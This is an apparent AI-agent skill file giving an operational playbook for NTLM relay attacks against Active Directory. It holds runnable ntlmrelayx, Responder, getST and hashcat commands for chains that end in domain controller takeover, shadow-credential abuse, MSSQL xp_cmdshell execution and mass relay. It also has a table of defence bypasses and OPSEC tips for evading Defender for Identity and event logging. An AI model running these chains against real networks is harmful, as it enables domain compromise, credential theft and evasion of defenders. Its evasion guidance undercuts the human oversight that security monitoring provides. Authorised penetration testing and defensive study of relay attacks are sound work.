---
name: ad-ntlm-relay
description: "NTLM relay deep-dive — `ntlmrelayx` configuration matrix (SMB, LDAP, LDAPS, HTTP, RPC, IMAP, MSSQL), SMB-signing bypass, target selection (DC for DCSync, ADCS for cert, LAPS reader for cleartext), session relay vs cracking trade-off, multi-relay (forward auth from one victim to many)."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "ntlm relay ntlmrelayx smb signing ldap ldaps adcs mssql relay multi-relay impacket"
  subdomain: ad
  tags: ad, ntlm-relay, mitm, impacket
  mitre_attack: T1557.001, T1550.002
---

# NTLM Relay Deep Dive

You've got NTLM authentication arriving at attacker (via Responder, ARP poison, coercion, mDNS, WPAD). Relay it to a target that grants you something useful.

## Target selection matrix

| Target protocol | Outcome | Requires |
|---|---|---|
| **LDAP / LDAPS to a DC** | Add user to Domain Admins, RBCD, modify ACL | Victim is local admin OR LDAPS allows signing |
| **SMB to a workstation** | Code exec on that workstation | SMB signing OFF on target (servers often have it ON) |
| **HTTP /certsrv/** (ADCS) | Cert for victim — auth as them | ADCS Web Enrollment enabled |
| **MSSQL** | Database access; `xp_cmdshell` if linked | Victim has DB privs |
| **IMAP** (Exchange) | Mailbox access | Victim has mailbox |
| **HTTP /EWS** (Exchange) | Mailbox + autodiscover | EWS reachable |
| **LDAPS to DC for shadow creds** | Set msDS-KeyCredentialLink on a victim | LDAPS + WriteProperty |

## SMB signing — the key constraint

| Target | Default SMB signing |
|---|---|
| DC | REQUIRED (signing on, must verify) — **can't relay SMB to DC** |
| Domain workstations | NOT REQUIRED (off by default) — **can relay** |
| File servers | usually REQUIRED |
| Linux Samba | varies |

Check with `crackmapexec smb <target_subnet> --gen-relay-list relays.txt` — gives you the list of targets where SMB signing is OFF.

## Most useful chains

### Coerce → relay to LDAP → RBCD attack
```bash
# Listener
sudo impacket-ntlmrelayx -t ldap://dc.target.local --delegate-access --escalate-user 'lowpriv'
# Now coerce DC$ (see ad-coercer skill)
# ntlmrelayx auto-adds attacker computer to msDS-AllowedToActOnBehalfOfOtherIdentity
# Then S4U2Proxy yourself onto the DC:
impacket-getST -spn 'cifs/dc.target.local' -impersonate Administrator 'target.local/lowpriv:pass'
# → TGS as Administrator for cifs on the DC — full takeover
```

### Coerce → relay to ADCS → DA cert
See `ad-certipy-esc-chain` skill — chain ends with `certipy auth` → krbtgt.

### Responder → relay to LDAP for Shadow Credentials
```bash
sudo responder -I eth0 -wd
# Catch broadcast LLMNR / NBT-NS / mDNS
# Then:
sudo impacket-ntlmrelayx -t ldaps://dc.target.local --shadow-credentials --shadow-target victim
# Adds a KeyCredentialLink to 'victim'; then auth as victim via certipy
```

### Relay to MSSQL — pivot via xp_cmdshell
```bash
sudo impacket-ntlmrelayx -t mssql://sqlserver.target.local -smb2support
# When relayed:
[ntlmrelayx] EXEC AS LOGIN sa: SUCCEED
[ntlmrelayx] Enabling xp_cmdshell on target
[ntlmrelayx] xp_cmdshell SUCCEED: id of nt service\mssqlserver
```

### Multi-relay — fan-out one auth to many targets
```bash
# -tf file_of_targets: relay to each in turn
sudo impacket-ntlmrelayx -tf relays.txt -smb2support
# crackmapexec --gen-relay-list builds the relays.txt file (SMB-signing-OFF hosts)
```

## When to crack instead of relay

If the auth is NetNTLMv2 (came from SMB1/SMB2, HTTP, etc.):

```bash
# Save the captured hash
# Responder writes to /usr/share/responder/logs/Responder-Session.log
hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
# m=5600 → NetNTLMv2 cracking; works well on rockyou+rules
```

Relay is BETTER when:
- You don't have time to crack (operationally bounded engagement)
- The hash is from a service account / computer account (uncrackable)
- The target requires the actual session (e.g., LDAPS, signed SMB)

Crack is BETTER when:
- You want offline persistence (don't need to be on the wire)
- The credentials are reusable across services
- Auth was from a normal user with a weak password

## Signing-required mitigations and bypasses

| Defense | Bypass |
|---|---|
| SMB signing required on target | Relay to NON-SMB target (LDAP, HTTP, MSSQL) |
| LDAP channel binding | Relay to LDAPS instead (different binding rules) |
| Extended Protection for Authentication (EPA) | Relay to a service that doesn't enforce EPA (older Exchange, etc.) |
| MS16-075 ("hot potato" SMB→SMB block) | Cross-protocol relay works around it |

## OPSEC

- Coercion is the LOUDEST step. Use unauthenticated PetitPotam variants where possible.
- LDAP relay creates events 4662 (object access) and 5136 (directory modify) on the DC — distinctive when DC$ modifies its own attributes via NTLM auth.
- MDI (Defender for Identity) flags NTLM relay via the source-vs-destination IP mismatch heuristic. Use a network position physically close to the victim to minimize the geographical jump.

## References

- impacket ntlmrelayx — github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- dirkjanm "NTLM relay" series (the canonical reference)
- SpecterOps "Hosting a Relay Server" / "Forcing NTLM auth"
- BHIS / TrustedSec "NTLM Relaying for Fun and Profit"
